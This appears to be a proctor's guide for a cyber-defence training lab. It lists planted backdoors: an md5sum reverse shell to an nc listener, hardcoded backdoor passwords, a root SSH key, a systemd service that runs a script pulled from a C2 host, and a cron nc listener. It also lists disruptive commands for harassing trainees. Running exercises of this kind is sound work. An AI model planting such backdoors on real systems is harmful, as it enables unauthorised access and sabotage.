# Hacker Activity
Things that lab proctors can do to the "web servers" to keep the lab interesting.

To get access to the web servers refer to the backdoors document.

## md5sum backdoor
run `nc -nlvp 4444` and when users run the `md5sum` command they'll connect to you.

## PAM backdoor
ssh into on any box using the password *I_love_hacks*

## SSH key
ssh into root on any box without a password using the ssh key

## very_suspicious_user
ssh into very_suspicious_user using the password *IAMAHACKER*

## ftp user
ssh into the ftp user on any box using the password *cybersec*

## malicious systemd service
You can put a script named run.sh on a webserver (port 8080) on the c2 host and the malicious systemd service will periodically try to run it.

## crontab nc listener
run `nc -v <host> 666` to connect to port 666 on any of the web hosts.

- Run walls
  - `wall "Hello there"`
- Echo text to terminal
  - `echo "Hello" > /dev/pts/0"`
- Kill random processes
  - `ps -A` to find a victim, `kill -9 <PID>` to kill
  - DO NOT kill PID 1, this will restart the server
- Mess up their terminal
  - `cat /dev/random > dev/pts/0`
- Turn services off and on
  - `systemctl stop vsftpd`
  - Don't turn off ssh
- Mess with binaries
  - For example, replace `bash` with a symlink to `pwsh` or something.
  - Also replace nano and vi with emacs
- Make new hacker accounts
  - `adduser not_a_malicious_account`
